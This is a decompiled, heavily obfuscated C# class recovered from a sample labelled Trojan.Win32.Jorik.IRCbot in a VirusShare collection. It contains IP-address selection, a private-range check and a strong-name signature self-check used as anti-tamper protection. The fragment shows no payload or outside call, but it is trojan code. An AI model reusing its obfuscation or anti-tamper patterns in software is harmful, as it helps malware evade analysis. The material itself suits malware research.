// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u0006;
using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0006
{
  internal sealed class \u0001
  {
    [NonSerialized]
    internal static \u0008.\u0004 \u0013;

    public static IPAddress \u0001([In] bool obj0) => \u0001.\u0001(\u0086.\u009D\u0002(\u001B\u0002.\u0002\u0004()), obj0);

    public static IPAddress \u0001([In] IPHostEntry obj0, [In] bool obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(\u0001.\u0013(4176));
      IPAddress ipAddress;
      do
      {
        int num1 = \u0087.\u007E\u009F\u0002((object) obj0).Length;
        int num2;
        int num3;
        if (true)
        {
          int num4 = num1;
          num3 = 1;
          num2 = num4;
        }
        else
          goto label_23;
label_5:
        IPAddress[] ipAddressArray;
        if (num2 != num3)
        {
          ipAddressArray = \u0087.\u007E\u009F\u0002((object) obj0);
          num1 = 0;
        }
        else
          goto label_22;
label_23:
        int index = num1;
        while (true)
        {
          num2 = index;
          num3 = ipAddressArray.Length;
          int num5;
          int num6;
          while (true)
          {
            if (true)
            {
              int num7 = num3;
              if (num2 < num7)
              {
                ipAddress = ipAddressArray[index];
                int num8 = \u0001.\u0001(ipAddress) ? 1 : 0;
                int num9;
                while (true)
                {
                  bool flag = num8 != 0;
                  if (!flag || !obj1)
                  {
                    if (!flag)
                    {
                      num9 = obj1 ? 1 : 0;
                      if (false)
                        num8 = num9;
                      else
                        break;
                    }
                    else
                      goto label_17;
                  }
                  else
                    goto label_10;
                }
                if (num9 == 0)
                  goto label_15;
label_17:
                num5 = index;
                num6 = 1;
                if (num6 == 0)
                {
                  num3 = num6;
                  num2 = num5;
                }
                else
                  break;
              }
              else
                goto label_22;
            }
            else
              goto label_5;
          }
          index = num5 + num6;
        }
label_10:
        continue;
label_15:
        if (false)
          goto label_10;
        else
          goto label_16;
      }
      while (false);
      return ipAddress;
label_16:
      return ipAddress;
label_22:
      return \u0087.\u007E\u009F\u0002((object) obj0)[0];
    }

    public static bool \u0001([In] IPAddress obj0)
    {
      if (obj0 == null)
        throw new ArgumentNullException(\u0001.\u0013(4185));
      byte[] numArray = \u0092\u0002.\u007E\u007F\u0004((object) obj0);
      int num1 = (int) numArray[0];
      int num2;
      while (true)
      {
        if (num1 == 10)
          goto label_16;
        else
          goto label_18;
label_6:
        int num3;
        if (true)
        {
          if (num2 == 168)
            goto label_16;
        }
        else
        {
          num3 = num2;
          goto label_11;
        }
label_8:
        int num4 = (int) numArray[0];
        if (false)
        {
          num1 = num4;
          continue;
        }
        if (num4 == 172)
          num3 = (int) numArray[1];
        else
          goto label_15;
label_11:
        if (num3 >= 16)
        {
          if (true)
          {
            num2 = numArray[1] <= (byte) 31 ? 1 : 0;
            if (false)
              goto label_6;
            else
              break;
          }
        }
        else
          goto label_15;
label_16:
        if (false)
          goto label_8;
        else
          goto label_17;
label_18:
        if (numArray[0] == (byte) 192)
        {
          num2 = (int) numArray[1];
          goto label_6;
        }
        else
          goto label_8;
      }
      return num2 != 0;
label_15:
      return false;
label_17:
      return true;
    }

    static \u0001()
    {
      do
      {
        \u0005.\u0001(typeof (\u0001));
        bool flag = false;
        Assembly assembly = \u007F.\u0089\u0002();
        if (\u0001.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
          goto label_7;
label_5:
        throw new SecurityException(\u0001.\u0013(731));
label_7:
        int num = flag ? 1 : 0;
        if (true)
        {
          if (num != 0)
            num = \u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0001.\u0013(706)) ? 1 : 0;
          else
            goto label_5;
        }
        if (num == 0)
          goto label_5;
      }
      while (false);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
